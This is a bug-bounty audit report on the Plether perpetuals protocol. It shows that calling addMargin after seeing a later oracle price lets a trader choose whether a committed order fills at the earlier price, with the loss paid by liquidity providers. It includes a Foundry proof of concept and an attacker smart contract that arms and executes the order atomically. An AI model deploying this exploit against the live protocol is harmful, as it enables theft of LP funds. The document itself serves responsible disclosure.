# \#99875 [SC-Low] `addMargin` turns a binding open into a trader-selected fill at LP expense

**Submitted on Nov 15th 2026 at 16:05:07 UTC by @thimthor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99875
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Relevant Context

Plether prices a live order at the first eligible Pyth observation after commitment. The liquidity pool takes the other side of trader positions. Orders enter a global FIFO queue and cannot be manually cancelled. The [execution documentation](https://docs.plether.com/how-plether-works/how-orders-execute) explains that allowing a trader to keep only orders favoured by a later observation would give them a free option. [Pyth's unique historical parser](https://api-reference.pyth.network/price-feeds/evm/parsePriceFeedUpdatesUnique) returns that first observation even after a newer update reaches Pyth storage. [PletherOracle](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L609-L622) uses the returned historical price; [Pyth ignores an older storage update](https://api-reference.pyth.network/price-feeds/evm/updatePriceFeeds).

The [execution guide](https://docs.plether.com/how-plether-works/how-orders-execute) says finalization reads current assigned margin. The project's [security model](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L658-L659) says binding orders prevent free options. Here the trader switches a terminal bound's outcome *after* learning a later price while the order and its bound price stay fixed.

## Finding Description

A trader with a small existing LONG position can commit a large increase with only 5,000 USDG of new order margin, a 20x `maxPostLeverageBps` limit, and another 12,000 USDG left as free settlement. The 20x limit is the trader's chosen execution bound, not the protocol's initial-margin limit. [`commitOrder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L270-L321) accepts this order because admission requires a nonzero bound but its [open preview](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L430-L445) does not assess that bound. At the first eligible price `E`, its projected leverage is 71.2948x, so execution without more pledged margin produces `ConstraintViolation(PostLeverage)`.

At execution, the [policy evaluator](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdOrderPolicyEvaluatorBase.sol#L377-L386) computes leverage from position margin and trader claims. Free settlement does not count. The owner can move that spare free settlement into position margin through [`addMargin`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L501-L521) while the order is pending:

```solidity
// CfdEngine.sol:518-520
        uint256 marginBefore = _positionMarginBucketAssets(account);
@>      clearinghouse.lockPositionMargin(account, amount);
        _sideState(pos.side).totalMargin += amount;
```

```solidity
// CfdOrderPolicyEvaluatorBase.sol:383-386, 539
            assessment.postPositionMarginAssets + assessment.postTraderClaimAssets,
            0
        );
        assessment.postLeverageBps = _postLeverageBps(riskState.currentNotionalAssets, riskState.equityAssets);
        // At the bound check:
@>      _requireMaximum(OrderV3Types.ConstraintKind.PostLeverage, assessment.postLeverageBps, bounds.maxPostLeverageBps);
```

After observing a later public price `M`, the trader calls `addMargin(12,000 USDG)` only if `M` favours the LONG. That lowers the same order's projected leverage at `E` to 18.5643x, so it fills at `E`, not `M`. If `M` is adverse, the trader leaves the order unarmed, which fails its own bound. Plether intentionally checks live assigned margin at finalization. Here commitment accepts a 71x order against its owner-selected 20x bound, and the owner decides whether to cure that known failure after `M`. The [accounting spec](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L930-L931) leaves market-dependent financial bounds dynamic; this PoC holds `E` and Pyth-stored `M` fixed and changes only the owner's pledge. Plether's engine mark stays older than `E` until execution. An owner-controlled contract can publish `M` to Pyth, add margin, and execute at `E` in one transaction.

The competition rules' HIGH-1 clock-alignment limitation concerns a price known *before* commitment; here `E` follows commitment and the decision follows `M`. `addMargin` existed by March 12, 2026 (`7df1c099`). [SC-M4](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf), dated May 4, used keeper price choice and an LP withdrawal to force a solvency refund. [Its May 7 first-price fix](https://github.com/Plether-Fi/plether-core/pull/24) preceded the owner-selected `maxPostLeverageBps` bound, [added to the V2 order schema on August 25](https://github.com/Plether-Fi/plether-core/blob/e8d9b558eead210c0d2d7ed6e04c0b5ebf0ab828/packages/perps/src/OrderV2Types.sol#L109) and retained in V3. This PoC uses the bound first price and needs no LP withdrawal: the owner instead flips a `PostLeverage` failure through pledged margin. Under the competition rules' incomplete-fix exception, it demonstrates a route to selective execution that the first-price fix leaves open. No liquidation or failed reserve funding is involved; correcting those paths would leave this margin action able to flip `PostLeverage`.

The published [SCAN-22](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1196) issue concerns an `E` timestamp older than the engine's cached mark. This PoC leaves `engine.lastMarkTime` **before** `E` after publishing `M` to Pyth. At finalization the [router installs `E` as the engine mark](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1052-L1060) before calling the Engine; the PoC checks `lastMarkTime == E_time` after both failed and successful execution. A SCAN-22 monotonic check would therefore compare `E` with `E`, not with `M`. The order fails `PostLeverage` when executed at `E` before `M`, and still fails when its owner executes it unarmed after `M`. With `E` and the Pyth-stored `M` fixed, the owner's `addMargin` alone changes the outcome.

## Impact Explanation

In the PoC, `M = E - 25 bps` favours the LONG. The raw historical observation is `E = 1.20000000`; the economic test's 5 bps confidence adjusts the LONG entry fill to `1.19985000`. The trader closes the entire position at the next eligible test tick, four seconds after `M`, at an assumed raw price of `E - 20 bps`. Against an identical branch without the increase, the trader gains 283.323698 USDG after protocol fees and HousePool cash falls 403.036772 USDG. Fees and the 0.20 USDG bounty paid to a third-party keeper account for the difference. The test asserts that the book is flat, trader claims are zero, pool backing equals cash, and the cash loss equals the trader gain plus fees and bounty. The claimed theft is the owner-selected execution choice: every executor fails the unarmed commitment, while the owner can arm it after `M` to take the favourable fill from LP principal.

With the same favourable `M` but no added margin, the order fails and LP cash is unchanged. At an adverse `M = E + 25 bps`, leaving it unarmed avoids a fill that would lose the trader 915.515286 USDG against the no-increase branch. A third-party keeper receives the failed order's 0.20 USDG bounty. If the owner executes the unarmed order, it still fails `PostLeverage`, but the bounty returns to the owner's free settlement. If the favourable `M` fully reverses to `E` by close, the armed trade instead loses 315.200256 USDG. These amounts exclude gas and Hermes access costs. The PoC's 1,000,000 USDG pool is a fixture: its 0.4 skew cap permits 400,000 USDG one-sided notional, and the increase uses 300,000 USDG. No production TVL is assumed.

## Recommendation

Bind the pledged-margin input for owner-selected `maxPostLeverageBps` and `minPostPositionEquityAssets` bounds when an open is committed. Reject an open that already fails those bounds. Let `addMargin` protect an existing position while the pending order's financial bounds continue to use their committed input. Keep live price and protocol safety checks.


## Proof of Concept

## Proof of Concept

Add the following file to a fresh built checkout at `packages/perps/test/perps/spec/trader/AddMarginBindingOpenPoC.t.sol`, then run from the repository root:

```bash
forge test --root packages/perps --match-path test/perps/spec/trader/AddMarginBindingOpenPoC.t.sol -vv
```

Result from the local run: all three tests pass. The order fails its 20x bound at 71.2948x before `M`; with `M` published to Pyth and the engine mark still older than `E`, it fails without added margin and fills at 18.5643x after `addMargin`. The closed-book test prints `trader gain (USDG): 283.323698`, `LP cash loss (USDG): 403.036772`, `full reversal trader loss (USDG): 315.200256`, and `forced adverse trader loss (USDG): 915.515286`. The third test proves the owner can execute an unarmed failure and recover its bounty, or publish `M`, arm, and fill at `E` atomically.

The repository's `BasePerpTest` uses two identical synthetic Pyth feeds and mock USDG. The atomic helper checks one of those equal feeds; Plether's production basket uses six. Its router test subclass adds a legacy overload; this PoC calls only the inherited production V3 functions. The in-scope engine, evaluator, and pool are unchanged. The cash test's USDG gain excludes gas and authenticated Hermes access. [Pyth Core currently lists zero EVM onchain verification fees](https://docs.pyth.network/pro/on-chain-fees), while [ongoing Hermes access requires an API key and paid plan](https://docs.pyth.network/pro/pyth-core-upgrade); net profit after those external costs is not measured. The atomic test deliberately sets a positive mock fee and forwards three fees to prove fee funding, not to estimate live fees.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPyth, PythStructs} from "@plether/shared/interfaces/IPyth.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract AddMarginBindingOpenPoC is BasePerpTest {

    address constant TRADER = address(0xA11);
    address constant KEEPER = address(0xB22);
    address constant RELAYER = address(0xC33);
    uint256 constant E = 120_000_000; // Raw basket price 1.20; LONG gains when it falls.
    uint256 constant BASE_SIZE = 1000e18;
    uint256 constant INCREASE_SIZE = 250_000e18; // 300,000 USDG notional at E.
    uint256 constant BASE_MARGIN = 100e6;
    uint256 constant ORDER_MARGIN = 5000e6;
    uint256 constant SPARE = 12_000e6;
    uint32 constant MAX_LEVERAGE_BPS = 200_000; // Trader's own 20x limit.
    uint256 nonce;

    struct Balances {
        int256 trader;
        int256 lpCash;
        int256 treasury;
        int256 keeper;
    }

    // A 1,000,000 USDG pool fixture with the release's skew, fee and confidence settings.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        IOrderRouterAdminHost.RouterConfig memory c = _routerConfig();
        c.minOpenNotionalAssets = 1000e6;
        c.basketMaxConfidenceRatioBps = 10;
        c.adverseConfidenceMultiplierBps = 2500;
        uint256 start = block.timestamp;
        _setRouterConfig(c);
        vm.warp(start + 7 days); // Return to the same open-market weekday.
        vm.roll(block.number + 1);
        assertFalse(engine.isFadWindow());
        assertEq(engine.executionFeeBps(), 4);
        assertEq(router.maxOpenOrderExecutionBountyAssets(), 0.2e6);

        _fundTrader(TRADER, BASE_MARGIN + _quoteOpenOrderExecutionBountyAssets(BASE_SIZE));
        uint64 baseId = _commit(false, BASE_SIZE, BASE_MARGIN, type(uint32).max);
        uint256 t = _commitTime(baseId);
        _execute(baseId, _price(E, 0, t + 1, t));
        uint256 free = _freeSettlementAssets(TRADER);
        if (free != 0) {
            vm.prank(TRADER);
            clearinghouse.withdraw(TRADER, free);
        }
    }

    function test_LaterPriceLetsTraderArmAnOtherwiseFailingOrder() public {
        _fundTrader(TRADER, ORDER_MARGIN + SPARE + _quoteOpenOrderExecutionBountyAssets(INCREASE_SIZE));
        uint64 id = _commit(false, INCREASE_SIZE, ORDER_MARGIN, MAX_LEVERAGE_BPS);
        uint256 t = _commitTime(id);
        bytes[] memory firstPrice = _price(E, 0, t + 1, t);
        assertEq(_freeSettlementAssets(TRADER), SPARE);

        // The order already fails its own 20x bound at E, before a newer mark exists.
        uint256 beforeMark = vm.snapshotState();
        _startRecordingLogs();
        OrderV3Types.ExecutionResult memory preMark = _execute(id, firstPrice);
        assertEq(uint8(preMark.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        OrderV3Types.OrderReceipt memory preMarkReceipt = _verifiedReceipt(router.lifecycleBook(), id);
        assertEq(uint8(preMarkReceipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.PostLeverage));
        assertEq(engine.lastMarkTime(), t + 1);
        assertTrue(vm.revertToState(beforeMark));

        // Publish M through Pyth, without changing Plether's cached mark.
        vm.warp(t + 2);
        vm.roll(block.number + 1);
        _publishM(E * 9975 / 10_000, t + 2, t + 1);
        assertLt(engine.lastMarkTime(), t + 1);
        uint256 snapshot = vm.snapshotState();

        // If a keeper executes before the trader adds margin, the order fails its own limit.
        uint256 traderBefore = _wealth(TRADER);
        uint256 lpBefore = settlementToken.balanceOf(address(pool));
        _startRecordingLogs();
        OrderV3Types.ExecutionResult memory result = _execute(id, firstPrice);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), id);
        assertEq(uint8(receipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.PostLeverage));
        assertGt(receipt.failure.actual, MAX_LEVERAGE_BPS);
        assertEq(traderBefore - _wealth(TRADER), 0.2e6);
        assertEq(settlementToken.balanceOf(address(pool)), lpBefore);
        assertEq(engine.lastMarkTime(), t + 1);
        emit log_named_decimal_uint("default post leverage (x)", receipt.failure.actual, 4);

        assertTrue(vm.revertToState(snapshot));
        // The same later price now informs the trader's margin decision.
        vm.prank(TRADER);
        engine.addMargin(TRADER, SPARE);

        _startRecordingLogs();
        result = _execute(id, firstPrice);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        receipt = _verifiedReceipt(router.lifecycleBook(), id);
        assertEq(receipt.executionPrice, E); // Still fills at the earlier price.
        assertEq(receipt.oraclePublishTime, t + 1);
        assertLe(receipt.economics.postLeverageBps, MAX_LEVERAGE_BPS);
        assertEq(engine.lastMarkTime(), t + 1);
        emit log_named_decimal_uint("armed post leverage (x)", receipt.economics.postLeverageBps, 4);
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, BASE_SIZE + INCREASE_SIZE);
    }

    function test_ClosedBookShowsLpCashLossAndAttackerProfit() public {
        _fundTrader(TRADER, ORDER_MARGIN + SPARE + _quoteOpenOrderExecutionBountyAssets(INCREASE_SIZE));
        uint256 snapshot = vm.snapshotState();

        Balances memory noAttack = _finish(false, false, E * 9975 / 10_000);
        assertTrue(vm.revertToState(snapshot));
        Balances memory declinedFavourable = _finish(true, false, E * 9975 / 10_000);
        assertEq(declinedFavourable.lpCash, noAttack.lpCash);
        assertEq(declinedFavourable.trader - noAttack.trader, -0.2e6);
        assertTrue(vm.revertToState(snapshot));
        Balances memory armed = _finish(true, true, E * 9975 / 10_000);
        int256 traderGain = armed.trader - noAttack.trader;
        int256 lpLoss = noAttack.lpCash - armed.lpCash;
        int256 fees = armed.treasury - noAttack.treasury;
        int256 bounty = armed.keeper - noAttack.keeper;
        assertGt(traderGain, 0);
        assertGt(lpLoss, 0);
        assertEq(lpLoss, traderGain + fees + bounty);
        assertEq(traderGain, 283_323_698);
        assertEq(lpLoss, 403_036_772);
        emit log_named_decimal_int("trader gain (USDG)", traderGain, 6);
        emit log_named_decimal_int("LP cash loss (USDG)", lpLoss, 6);

        assertTrue(vm.revertToState(snapshot));
        Balances memory noAttackReversal = _finishAtClose(false, false, E * 9975 / 10_000, E);
        assertTrue(vm.revertToState(snapshot));
        Balances memory fullReversal = _finishAtClose(true, true, E * 9975 / 10_000, E);
        assertLt(fullReversal.trader, noAttackReversal.trader);
        assertEq(noAttackReversal.trader - fullReversal.trader, 315_200_256);
        emit log_named_decimal_int("full reversal trader loss (USDG)", noAttackReversal.trader - fullReversal.trader, 6);

        assertTrue(vm.revertToState(snapshot));
        Balances memory noAttackAdverse = _finish(false, false, E * 10_025 / 10_000);
        assertTrue(vm.revertToState(snapshot));
        Balances memory declined = _finish(true, false, E * 10_025 / 10_000);
        assertEq(noAttackAdverse.lpCash, declined.lpCash);
        assertEq(declined.trader - noAttackAdverse.trader, -0.2e6);

        // A mandatory fill in the adverse branch transfers value in the opposite direction.
        assertTrue(vm.revertToState(snapshot));
        Balances memory forcedAdverse = _finish(true, true, E * 10_025 / 10_000);
        assertLt(forcedAdverse.trader, noAttackAdverse.trader);
        assertGt(forcedAdverse.lpCash, noAttackAdverse.lpCash);
        assertEq(noAttackAdverse.trader - forcedAdverse.trader, 915_515_286);
        emit log_named_decimal_int(
            "forced adverse trader loss (USDG)", noAttackAdverse.trader - forcedAdverse.trader, 6
        );
    }

    function test_SmartAccountArmsAndExecutesInOneTransaction() public {
        bytes32[] memory feeds = _basePythFeedIds();
        BindingOpenAccount account = new BindingOpenAccount(engine, router, pletherOracle.pyth(), feeds[0]);
        address trader = address(account);
        _fundAccount(trader, BASE_MARGIN + _quoteOpenOrderExecutionBountyAssets(BASE_SIZE));
        uint64 baseId = account.commit(_request(false, BASE_SIZE, BASE_MARGIN, type(uint32).max));
        uint256 baseTime = _commitTime(baseId);
        _execute(baseId, _price(E, 0, baseTime + 1, baseTime));

        _fundAccount(trader, ORDER_MARGIN + SPARE + _quoteOpenOrderExecutionBountyAssets(INCREASE_SIZE));
        uint64 id = account.commit(_request(false, INCREASE_SIZE, ORDER_MARGIN, MAX_LEVERAGE_BPS));
        uint256 t = _commitTime(id);
        bytes[] memory firstPrice = _price(E, 0, t + 1, t);
        assertEq(_freeSettlementAssets(trader), SPARE);

        vm.warp(t + 2);
        vm.roll(block.number + 1);
        uint256 snapshot = vm.snapshotState();
        _publishM(E * 10_025 / 10_000, t + 2, t + 1);
        vm.expectRevert(BindingOpenAccount.NotFavourable.selector);
        account.publishArmAndExecute(
            id, SPARE, E * 9975 / 10_000, _price(E * 10_025 / 10_000, 0, t + 2, t + 1), firstPrice
        );

        // Even owner execution cannot force the unarmed open through its leverage bound.
        uint256 poolCash = settlementToken.balanceOf(address(pool));
        uint256 wealthBefore = _wealth(trader);
        _startRecordingLogs();
        OrderV3Types.ExecutionResult memory unarmed = account.executeUnarmed(id, firstPrice);
        assertEq(uint8(unarmed.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        OrderV3Types.OrderReceipt memory failedReceipt = _verifiedReceipt(router.lifecycleBook(), id);
        assertEq(uint8(failedReceipt.failure.constraint), uint8(OrderV3Types.ConstraintKind.PostLeverage));
        assertEq(failedReceipt.executor, trader);
        assertEq(failedReceipt.bountyRecipient, trader);
        assertEq(_wealth(trader), wealthBefore);
        assertEq(settlementToken.balanceOf(address(pool)), poolCash);
        assertEq(engine.lastMarkTime(), t + 1);
        assertTrue(vm.revertToState(snapshot));

        uint256 pythFee = 0.0001 ether;
        MockPyth(address(pletherOracle.pyth())).setFee(pythFee);
        vm.deal(address(this), 3 * pythFee);
        _startRecordingLogs();
        OrderV3Types.ExecutionResult memory result = account.publishArmAndExecute{value: 3 * pythFee}(
            id, SPARE, E * 9975 / 10_000, _price(E * 9975 / 10_000, 0, t + 2, t + 1), firstPrice
        );
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        assertEq(block.timestamp, t + 2);
        OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), id);
        assertEq(receipt.executionPrice, E);
        assertEq(receipt.executor, trader);
        assertEq(receipt.bountyRecipient, trader);
        assertEq(engine.lastMarkTime(), t + 1);
        PythStructs.Price memory storedM = pletherOracle.pyth().getPriceUnsafe(feeds[0]);
        assertEq(int256(storedM.price), int256(E * 9975 / 10_000));
        assertEq(storedM.publishTime, t + 2);
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, BASE_SIZE + INCREASE_SIZE);
    }

    // Each branch closes every position at the same later price. No trader claims remain.
    function _finish(
        bool commitIncrease,
        bool arm,
        uint256 laterPrice
    ) internal returns (Balances memory b) {
        uint256 closePrice = laterPrice < E ? E * 9980 / 10_000 : E * 10_020 / 10_000;
        return _finishAtClose(commitIncrease, arm, laterPrice, closePrice);
    }

    function _finishAtClose(
        bool commitIncrease,
        bool arm,
        uint256 laterPrice,
        uint256 closePrice
    ) internal returns (Balances memory b) {
        uint256 traderStart = _wealth(TRADER);
        uint256 keeperStart = _wealth(KEEPER);
        uint256 lpStart = settlementToken.balanceOf(address(pool));
        uint256 treasuryStart = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 t = vm.getBlockTimestamp();
        uint64 id;
        if (commitIncrease) {
            id = _commit(false, INCREASE_SIZE, ORDER_MARGIN, MAX_LEVERAGE_BPS);
        }
        bytes[] memory firstPrice = _price(E, E * 5 / 10_000, t + 1, t);
        vm.warp(t + 5);
        vm.roll(block.number + 1);
        _publishM(laterPrice, t + 4, t + 3);
        assertLt(engine.lastMarkTime(), t + 1);
        if (arm) {
            vm.prank(TRADER);
            engine.addMargin(TRADER, SPARE);
        }
        if (commitIncrease) {
            if (arm) {
                _startRecordingLogs();
            }
            OrderV3Types.ExecutionResult memory r = _execute(id, firstPrice);
            assertEq(
                uint8(r.status),
                uint8(arm ? OrderV3Types.LifecycleStatus.Executed : OrderV3Types.LifecycleStatus.Failed)
            );
            if (arm) {
                OrderV3Types.OrderReceipt memory receipt = _verifiedReceipt(router.lifecycleBook(), id);
                assertEq(receipt.executionPrice, 119_985_000); // E after 1.25 bps adverse confidence adjustment.
            }
        }
        vm.warp(t + 7); // First fresh close tick after M and the increase's finalization.
        vm.roll(block.number + 1);
        (uint256 size,,,,,,) = engine.positions(TRADER);
        uint64 closeId = _commit(true, size, 0, type(uint32).max);
        uint256 closeTime = _commitTime(closeId);
        _execute(closeId, _price(closePrice, closePrice * 5 / 10_000, closeTime + 1, closeTime));
        (size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        assertEq(pool.totalAssets(), settlementToken.balanceOf(address(pool)));
        b.trader = int256(_wealth(TRADER)) - int256(traderStart);
        b.keeper = int256(_wealth(KEEPER)) - int256(keeperStart);
        b.lpCash = int256(settlementToken.balanceOf(address(pool))) - int256(lpStart);
        b.treasury = int256(clearinghouse.balanceAssets(engine.protocolTreasury())) - int256(treasuryStart);
    }

    function _commit(
        bool close,
        uint256 size,
        uint256 margin,
        uint32 leverage
    ) internal returns (uint64 id) {
        OrderV3Types.OrderRequest memory request = _request(close, size, margin, leverage);
        vm.prank(TRADER);
        id = router.commitOrder(request);
    }

    function _request(
        bool close,
        uint256 size,
        uint256 margin,
        uint32 leverage
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(++nonce)),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: close ? type(uint256).max : 1,
            isClose: close,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
                executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: leverage
            })
        });
    }

    function _fundAccount(
        address account,
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.depositFor(account, amount);
    }

    function _commitTime(
        uint64 id
    ) internal view returns (uint256) {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(id);
        return pending.commitTime;
    }

    function _execute(
        uint64 id,
        bytes[] memory data
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        vm.prank(KEEPER);
        result = router.executeOrder(id, data);
    }

    function _publishM(
        uint256 price,
        uint256 publishTime,
        uint256 previousTime
    ) internal {
        bytes[] memory data = _price(price, 0, publishTime, previousTime);
        uint256 oldMarkPrice = engine.lastMarkPrice();
        uint64 oldMarkTime = engine.lastMarkTime();
        vm.prank(RELAYER);
        pletherOracle.pyth().updatePriceFeeds(data);
        bytes32[] memory feeds = _basePythFeedIds();
        PythStructs.Price memory observed = pletherOracle.pyth().getPriceUnsafe(feeds[0]);
        assertEq(int256(observed.price), int256(price));
        assertEq(observed.publishTime, publishTime);
        assertEq(engine.lastMarkPrice(), oldMarkPrice);
        assertEq(engine.lastMarkTime(), oldMarkTime);
    }

    function _price(
        uint256 price,
        uint256 confidence,
        uint256 publishTime,
        uint256 previousTime
    ) internal pure returns (bytes[] memory data) {
        bytes32[] memory feeds = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feeds.length);
        for (uint256 i; i < feeds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feeds[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(price)),
                    conf: uint64(confidence),
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _wealth(
        address account
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(account) + clearinghouse.balanceAssets(account)
            + engine.traderClaimBalanceAssets(account);
    }

}

contract BindingOpenAccount {

    error NotFavourable();

    address immutable owner;
    CfdEngine immutable engine;
    OrderRouter immutable router;
    IPyth immutable pyth;
    bytes32 immutable feedId;

    constructor(
        CfdEngine engine_,
        OrderRouter router_,
        IPyth pyth_,
        bytes32 feedId_
    ) {
        owner = msg.sender;
        engine = engine_;
        router = router_;
        pyth = pyth_;
        feedId = feedId_;
    }

    function commit(
        OrderV3Types.OrderRequest calldata request
    ) external returns (uint64) {
        require(msg.sender == owner);
        return router.commitOrder(request);
    }

    function publishArmAndExecute(
        uint64 orderId,
        uint256 margin,
        uint256 maxMark,
        bytes[] calldata laterPrice,
        bytes[] calldata firstPrice
    ) external payable returns (OrderV3Types.ExecutionResult memory) {
        require(msg.sender == owner);
        uint256 laterFee = pyth.getUpdateFee(laterPrice);
        uint256 firstFee = pyth.getUpdateFee(firstPrice);
        require(msg.value == laterFee + 2 * firstFee);
        pyth.updatePriceFeeds{value: laterFee}(laterPrice);
        PythStructs.Price memory latest = pyth.getPriceUnsafe(feedId);
        if (latest.price <= 0 || uint256(uint64(latest.price)) > maxMark) {
            revert NotFavourable();
        }
        engine.addMargin(address(this), margin);
        return router.executeOrder{value: 2 * firstFee}(orderId, firstPrice);
    }

    function executeUnarmed(
        uint64 orderId,
        bytes[] calldata firstPrice
    ) external payable returns (OrderV3Types.ExecutionResult memory) {
        require(msg.sender == owner);
        return router.executeOrder{value: msg.value}(orderId, firstPrice);
    }

}
```
